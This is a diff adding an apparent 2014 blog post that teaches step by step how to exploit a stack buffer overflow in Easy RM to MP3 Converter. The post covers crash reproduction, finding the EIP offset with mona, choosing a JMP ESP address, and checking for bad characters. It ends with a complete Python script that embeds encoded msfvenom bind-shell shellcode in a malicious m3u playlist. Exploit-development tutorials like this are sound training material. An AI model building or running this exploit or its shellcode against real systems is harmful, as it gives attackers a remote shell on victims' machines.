@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta itemprop="name" content="Easy RM to MP3 Converter">
+  <title>Easy RM to MP3 Converter</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta itemprop="description" content="Prequisites Windows XP SP3 (en-us) Immunity Debugger Easy RM to MP3 Converter Identifying the Vulnerability First of all we need to identify the appropriate buffer size for the exploit. To do this, we simply execute the following python script. 1 buffer = &quot;A&quot; * 30000 2 3 filename=&quot;evil.m3u&quot; 4 evilfile = open(filename , &#39;w&#39;) 5 evilfile.write(buffer) 6 evilfile.close() Identifying EIP Offset Subsequently, open up the resulting playlist in the converter. Boom, the application crashes.">
+
+  
+  <meta itemprop="keywords" content="certifications,challenge,ctf,exploit,exploit-exercises,offensive-security,protostar,reverse-engineering,sans,seh," />
+  
+    <meta itemprop="wordCount" content="551">
+  
+
+  <meta property="og:title" content="Easy RM to MP3 Converter" />
+  <meta property="og:description" content="Prequisites Windows XP SP3 (en-us) Immunity Debugger Easy RM to MP3 Converter Identifying the Vulnerability First of all we need to identify the appropriate buffer size for the exploit. To do this, we simply execute the following python script. 1 buffer = &quot;A&quot; * 30000 2 3 filename=&quot;evil.m3u&quot; 4 evilfile = open(filename , &#39;w&#39;) 5 evilfile.write(buffer) 6 evilfile.close() Identifying EIP Offset Subsequently, open up the resulting playlist in the converter. Boom, the application crashes." />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="http://camelinc.info/blog/2014/05/Easy-RM-to-MP3-Converter/" />
+  
+
+  
+  <meta property="og:updated_time" content="2014-05-25 11:27:27 &#43;0000 UTC"/>
+  
+  
+  
+  
+
+  
+    <meta name="twitter:card" content="summary"/>
+  
+
+  
+  <meta name="twitter:title" content="Easy RM to MP3 Converter"/>
+  <meta name="twitter:description" content="Prequisites Windows XP SP3 (en-us) Immunity Debugger Easy RM to MP3 Converter Identifying the Vulnerability First of all we need to identify the appropriate buffer size for the exploit. To do this, we simply execute the following python script. 1 buffer = &quot;A&quot; * 30000 2 3 filename=&quot;evil.m3u&quot; 4 evilfile = open(filename , &#39;w&#39;) 5 evilfile.write(buffer) 6 evilfile.close() Identifying EIP Offset Subsequently, open up the resulting playlist in the converter. Boom, the application crashes."/>
+  
+  
+
+
+  <meta name="generator" content="Hugo 0.15" />
+  <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
+  <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
+  <link href="http://camelinc.info//css/hc.css" rel="stylesheet">
+
+  
+  <link rel="stylesheet" href="http://camelinc.info//css/zenburn.css" type="text/css" media="screen" />
+
+  
+
+  
+  <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">
+
+
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+  
+  
+</head>
+ 
+
+
+  <body>
+
+  
+<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
+  <div id = "wrapper">
+
+<div class="navbar navbar-default" role="navigation">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a href="http://camelinc.info//"><p class="navbar-brand">camelinc</p></a>
+        </div>
+
+        <div class="navbar-collapse collapse">
+          <ul class="nav navbar-nav">
+					
+          <h2>http://camelinc.info/</h2>
+					
+					<li><a href="http://camelinc.info/about">About </a></li>
+					
+					<li><a href="http://camelinc.info/post">Posts </a></li>
+					
+          </ul>
+        </div>
+      </div>
+    </div>
+
+       
+       <div id="sidebar-wrapper">
+        <ul class="sidebar-nav">
+					<img src="/img/avatar.png" />
+          <li class="sidebar-brand"><a href="http://camelinc.info//"><h1 class="brand">camelinc</h1></a><h3></h3></li>
+          <hr />
+
+					
+						<li><a href="http://camelinc.info/about">About </a></li>
+					
+						<li><a href="http://camelinc.info/post">Posts </a></li>
+					
+          <hr />
+
+          <div id="social-wrapper">
+           
+             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
+           
+
+           
+             
+           
+
+           
+             
+           
+
+           
+             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
+           
+         </div>
+
+       </ul>
+     </div>
+
+     <div class="container">
+
+
+
+  <div id="article">
+    <div class="article-title">Easy RM to MP3 Converter</div>
+    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2014-05-25</small></p> <hr/>
+    <div class="post">
+      
+
+<h1 id="prequisites:2fa3dea1838e5e913d9862f6536a17e3">Prequisites</h1>
+
+<ul>
+<li>Windows XP SP3 (en-us)</li>
+<li><a href="http://www.immunityinc.com/products-immdbg.shtml">Immunity Debugger</a></li>
+<li><a href="http://www.exploit-db.com/wp-content/themes/exploit/applications/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe">Easy RM to MP3 Converter</a></li>
+</ul>
+
+<h1 id="identifying-the-vulnerability:2fa3dea1838e5e913d9862f6536a17e3">Identifying the Vulnerability</h1>
+
+<p>First of all we need to identify the appropriate buffer size for the exploit.
+To do this, we  simply execute the following python script.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="lineno">1 </span><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">30000</span>
+<span class="lineno">2 </span>
+<span class="lineno">3 </span><span class="n">filename</span><span class="o">=</span><span class="s">&quot;evil.m3u&quot;</span>
+<span class="lineno">4 </span><span class="n">evilfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span> <span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span>
+<span class="lineno">5 </span><span class="n">evilfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
+<span class="lineno">6 </span><span class="n">evilfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+
+
+<h1 id="identifying-eip-offset:2fa3dea1838e5e913d9862f6536a17e3">Identifying EIP Offset</h1>
+
+<p>Subsequently, open up the resulting playlist in the converter.
+Boom, the application crashes.</p>
+
+
+
+<figure >
+    <a href="/img/post/2014/easy-rm-to-mp3-converter/initial_crash.png" data-lightbox="default" data-title="Register values at the access violation. EIP was overwritten with AAAA" >
+        <img src="/img/post/2014/easy-rm-to-mp3-converter/initial_crash.png" alt="Register values at the access violation. EIP was overwritten with AAAA" >
+    </a>
+</figure>
+
+
+
+<p>It seems that we can simply overwrite EIP.
+In order to identify the correct offset of the overflow let&rsquo;s create a pattern and start again.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona pc 5000</span>
+</code></pre></div>
+
+
+<p>For this run 25k As are followed by the pattern.
+This time we directly start the application via Immunity.
+The application crashes and we now have a unique pattern stored in EIP.</p>
+
+
+
+<figure >
+    <a href="/img/post/2014/easy-rm-to-mp3-converter/find_pattern.png" data-lightbox="default" data-title="Identifying the offset of EIP with a unique pattern." >
+        <img src="/img/post/2014/easy-rm-to-mp3-converter/find_pattern.png" alt="Identifying the offset of EIP with a unique pattern." >
+    </a>
+</figure>
+
+
+
+<p>When the debugger stops because of the overflow we can identify the correct offset for our custom EIP.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona findmsp</span>
+</code></pre></div>
+
+
+
+
+<figure >
+    <a href="/img/post/2014/easy-rm-to-mp3-converter/findmsp.png" data-lightbox="default" data-title="Mona helps in identifying the offset for the EIP overwrite (offset 1109)." >
+        <img src="/img/post/2014/easy-rm-to-mp3-converter/findmsp.png" alt="Mona helps in identifying the offset for the EIP overwrite (offset 1109)." >
+    </a>
+</figure>
+
+
+
+<p>The offset for EIP is 25000 + 1109 = 26109.
+Subsequently, this allows an update of the exploit script in order to reflect the newly acquired knowledge.
+This gives us power over EIP.</p>
+
+<p>
+
+<figure >
+    <a href="/img/post/2014/easy-rm-to-mp3-converter/overwrite_EIP.png" data-lightbox="default" data-title="Verifying the offset by overwriting EIP with BBBB." >
+        <img src="/img/post/2014/easy-rm-to-mp3-converter/overwrite_EIP.png" alt="Verifying the offset by overwriting EIP with BBBB." >
+    </a>
+</figure>
+
+</p>
+
+<h1 id="controlling-eip:2fa3dea1838e5e913d9862f6536a17e3">Controlling EIP</h1>
+
+<p>The next step is to jump to a shellcode.
+Mona helps finding an appropriate address in memory.</p>
+
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona jmp -r esp</span>
+</code></pre></div>
+</p>
+
+<p>
+
+<figure >
+    <a href="/img/post/2014/easy-rm-to-mp3-converter/jmp_esp.png" data-lightbox="default" data-title="Moan.py lists the possible JMP ESP instructions." >
+        <img src="/img/post/2014/easy-rm-to-mp3-converter/jmp_esp.png" alt="Moan.py lists the possible JMP ESP instructions." >
+    </a>
+</figure>
+
+</p>
+
+<p>For this exploit the instruction at 0x77c72eee was chosen.
+This allows us to jump to ESP.</p>
+
+<h1 id="identifying-bad-characters:2fa3dea1838e5e913d9862f6536a17e3">Identifying Bad Characters</h1>
+
+<p>As ESP points to 0x000FF730 (EIP+4) we can place our shellcode at the specific location.
+Before generating a payload, we also have to check for <strong>bad characters</strong>.
+Mona also provides help and can create an array with excluded characters.</p>
+
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona bytearray -b &#39;\x00\x0A&#39;</span>
+</code></pre></div>
+</p>
+
+<p>The array has to be included in the buffer.
+Subsequently, bad characters can be identified in a debugger.</p>
+
+<p>
+
+<figure >
+    <a href="/img/post/2014/easy-rm-to-mp3-converter/bad_chars.png" data-lightbox="default" data-title="The byte array in memory is used to identify bad characters." >
+        <img src="/img/post/2014/easy-rm-to-mp3-converter/bad_chars.png" alt="The byte array in memory is used to identify bad characters." >
+    </a>
+</figure>
+
+</p>
+
+<p>Mona also provides a command to help with this step of exploit development.</p>
+
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona compare -f bytearray.bin</span>
+</code></pre></div>
+</p>
+
+<h1 id="adding-shellcode:2fa3dea1838e5e913d9862f6536a17e3">Adding Shellcode</h1>
+
+<p>After iterating the above process in order to identify all bad characters a payload can be create.
+Metasploit provides numerous payloads to choose from.
+Most importantly, the payload has to be encoded as to eliminate any bad characters.</p>
+
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">msfvenom -p windows/console_bind_tcp LPORT=9988 -f python --platform win --arch x86 -b &#39;\x00\x0a\x0d&#39;</span>
+</code></pre></div>
+</p>
+
+<h1 id="the-exploit:2fa3dea1838e5e913d9862f6536a17e3">The Exploit</h1>
+
+<p>Following this, the payload has to be added to the exploit script.
+The final step is to create the malicious m3u file and manually load it into the software.</p>
+
+<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="lineno"> 1 </span><span class="c">#!/usr/bin/python -w</span>
+<span class="lineno"> 2 </span>
+<span class="lineno"> 3 </span><span class="kn">import</span> <span class="nn">struct</span>
+<span class="lineno"> 4 </span>
+<span class="lineno"> 5 </span><span class="c">#-------------------------------------------------------------------------------------------------------#</span>
+<span class="lineno"> 6 </span><span class="c"># msfvenom -p windows/console_bind_tcp LPORT=9988 -f python --platform win --arch x86 -b &#39;\x00\x0A\x0D&#39; #</span>
+<span class="lineno"> 7 </span><span class="c"># [*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)                                          #</span>
+<span class="lineno"> 8 </span><span class="c">#-------------------------------------------------------------------------------------------------------#</span>
+<span class="lineno"> 9 </span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
+<span class="lineno">10 </span><span class="s">&quot;</span><span class="se">\xdb\xd0\xbb\x36\xcc\x70\x15\xd9\x74\x24\xf4\x5a\x33\xc9\xb1</span><span class="s">&quot;</span>
+<span class="lineno">11 </span><span class="s">&quot;</span><span class="se">\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a\x22\x2e\x85\xe9\xa2\x27</span><span class="s">&quot;</span>
+<span class="lineno">12 </span><span class="s">&quot;</span><span class="se">\x66\x12\x32\x58\xee\xf7\x03\x4a\x94\x7c\x31\x5a\xde\xd1\xb9</span><span class="s">&quot;</span>
+<span class="lineno">13 </span><span class="s">&quot;</span><span class="se">\x11\xb2\xc1\x4a\x57\x1b\xe5\xfb\xd2\x7d\xc8\xfc\xd2\x41\x86</span><span class="s">&quot;</span>
+<span class="lineno">14 </span><span class="s">&quot;</span><span class="se">\x3e\x74\x3e\xd5\x12\x56\x7f\x16\x67\x97\xb8\x4b\x87\xc5\x11</span><span class="s">&quot;</span>
+<span class="lineno">15 </span><span class="s">&quot;</span><span class="se">\x07\x35\xfa\x16\x55\x85\xfb\xf8\xd1\xb5\x83\x7d\x25\x41\x3e</span><span class="s">&quot;</span>
+<span class="lineno">16 </span><span class="s">&quot;</span><span class="se">\x7f\x76\xf9\x35\x37\x6e\x72\x11\xe8\x8f\x57\x41\xd4\xc6\xdc</span><span class="s">&quot;</span>
+<span class="lineno">17 </span><span class="s">&quot;</span><span class="se">\xb2\xae\xd8\x34\x8b\x4f\xeb\x78\x40\x6e\xc3\x75\x98\xb6\xe4</span><span class="s">&quot;</span>
+<span class="lineno">18 </span><span class="s">&quot;</span><span class="se">\x65\xef\xcc\x16\x18\xe8\x16\x64\xc6\x7d\x8b\xce\x8d\x26\x6f</span><span class="s">&quot;</span>
+<span class="lineno">19 </span><span class="s">&quot;</span><span class="se">\xee\x42\xb0\xe4\xfc\x2f\xb6\xa3\xe0\xae\x1b\xd8\x1d\x3b\x9a</span><span class="s">&quot;</span>
+<span class="lineno">20 </span><span class="s">&quot;</span><span class="se">\x0f\x94\x7f\xb9\x8b\xfc\x24\xa0\x8a\x58\x8b\xdd\xcd\x05\x74</span><span class="s">&quot;</span>
+<span class="lineno">21 </span><span class="s">&quot;</span><span class="se">\x78\x85\xa4\x61\xfa\xc4\xa0\x46\x31\xf7\x30\xc0\x42\x84\x02</span><span class="s">&quot;</span>
+<span class="lineno">22 </span><span class="s">&quot;</span><span class="se">\x4f\xf9\x02\x2f\x18\x27\xd4\x50\x33\x9f\x4a\xaf\xbb\xe0\x43</span><span class="s">&quot;</span>
+<span class="lineno">23 </span><span class="s">&quot;</span><span class="se">\x74\xef\xb0\xfb\x5d\x8f\x5a\xfc\x62\x5a\xcc\xac\xcc\x34\xad</span><span class="s">&quot;</span>
+<span class="lineno">24 </span><span class="s">&quot;</span><span class="se">\x1c\xad\xe4\x45\x77\x22\xdb\x76\x78\xe8\x6a\xb1\xb6\xc8\x3f</span><span class="s">&quot;</span>
+<span class="lineno">25 </span><span class="s">&quot;</span><span class="se">\x56\xbb\xee\x98\xa2\x32\x08\x8c\xba\x12\x82\x38\x79\x41\x1b</span><span class="s">&quot;</span>
+<span class="lineno">26 </span><span class="s">&quot;</span><span class="se">\xdf\x82\xa3\x37\x48\x15\xfb\x51\x4e\x1a\xfc\x77\xfd\xb7\x54</span><span class="s">&quot;</span>
+<span class="lineno">27 </span><span class="s">&quot;</span><span class="se">\x10\x75\xd4\x60\x01\x8a\xf1\xc0\x48\xb3\x92\x9b\x24\x76\x02</span><span class="s">&quot;</span>
+<span class="lineno">28 </span><span class="s">&quot;</span><span class="se">\x9b\x6c\xe0\xa7\x0e\xeb\xf0\xae\x32\xa4\xa7\xe7\x85\xbd\x2d</span><span class="s">&quot;</span>
+<span class="lineno">29 </span><span class="s">&quot;</span><span class="se">\x1a\xbf\x17\x53\xe7\x59\x5f\xd7\x3c\x9a\x5e\xd6\xb1\xa6\x44</span><span class="s">&quot;</span>
+<span class="lineno">30 </span><span class="s">&quot;</span><span class="se">\xc8\x0f\x26\xc1\xbc\xdf\x71\x9f\x6a\xa6\x2b\x51\xc4\x70\x87</span><span class="s">&quot;</span>
+<span class="lineno">31 </span><span class="s">&quot;</span><span class="se">\x3b\x80\x05\xeb\xfb\xd6\x09\x26\x8a\x36\xbb\x9f\xcb\x49\x74</span><span class="s">&quot;</span>
+<span class="lineno">32 </span><span class="s">&quot;</span><span class="se">\x48\xdc\x32\x68\xe8\x23\xe9\x28\x18\x6e\xb3\x19\xb1\x37\x26</span><span class="s">&quot;</span>
+<span class="lineno">33 </span><span class="s">&quot;</span><span class="se">\x18\xdc\xc7\x9d\x5f\xd9\x4b\x17\x20\x1e\x53\x52\x25\x5a\xd3</span><span class="s">&quot;</span>
+<span class="lineno">34 </span><span class="s">&quot;</span><span class="se">\x8f\x57\xf3\xb6\xaf\xc4\xf4\x92</span><span class="s">&quot;</span><span class="p">)</span>
+<span class="lineno">35 </span>
+<span class="lineno">36 </span><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">26109</span>
+<span class="lineno">37 </span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt; L&#39;</span><span class="p">,</span><span class="mh">0x77c72eee</span><span class="p">)</span> <span class="c"># jmp esp [msv1_0.dll] </span>
+<span class="lineno">38 </span><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">25</span>
+<span class="lineno">39 </span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">shellcode</span>
+<span class="lineno">40 </span><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;C&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">30000</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>
+<span class="lineno">41 </span>
+<span class="lineno">42 </span><span class="n">filename</span><span class="o">=</span><span class="s">&quot;evil.m3u&quot;</span>
+<span class="lineno">43 </span><span class="n">evilfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span> <span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span>
+<span class="lineno">44 </span><span class="n">evilfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
+<span class="lineno">45 </span><span class="n">evilfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+</p>
+
+<p>By loading the m3u file, the payload is executed.</p>
+
+<p>
+
+<figure >
+    <a href="/img/post/2014/easy-rm-to-mp3-converter/bind_shell.png" data-lightbox="default" data-title="Local listening services before and after bind shell is started by opening the custom m3u file" >
+        <img src="/img/post/2014/easy-rm-to-mp3-converter/bind_shell.png" alt="Local listening services before and after bind shell is started by opening the custom m3u file" >
+    </a>
+</figure>
+
+</p>
+
+<h1 id="links-and-references:2fa3dea1838e5e913d9862f6536a17e3">Links and References</h1>
+
+<ul>
+<li><a href="http://www.exploit-db.com/exploits/9186/">EDB-ID: 9186</a></li>
+<li><a href="http://www.exploit-db.com/exploits/10374/">EDB-ID: 10374</a></li>
+<li><a href="http://blog.pusheax.com/2013/03/exploit-writing-stack-based-buffer.html">Exploit writing tutorial part 1 : Stack Based Overflows</a></li>
+</ul>
+
+    </div>
+  </div>
+
+  <ul class="pager">
+    
+
+    
+      
+        &nbsp;<li class="previous"><a href="http://camelinc.info/blog/2014/05/Aviosoft-Digital-TV-Player-Professional-1.0-Stack-Buffer-Overflow/"> Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow</a></li>
+      
+    
+    
+  </ul>
+
+
+
+<footer>
+
+  <p class="text-muted credit">&copy; . All rights reserved. </p>
+    </footer>
+
+  
+  
+
+  <script type="text/javascript" src="/js/jquery-2.1.4.js"></script>
+
+  <script src="/js/bootstrap.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+  <script type="text/javascript" src="/js/hc.js"></script>
+
+  
+  <script type="text/javascript" src="/lightbox/js/lightbox.js"></script>
+
+  
+
+</footer>
+
+
+	</body>
+</html>
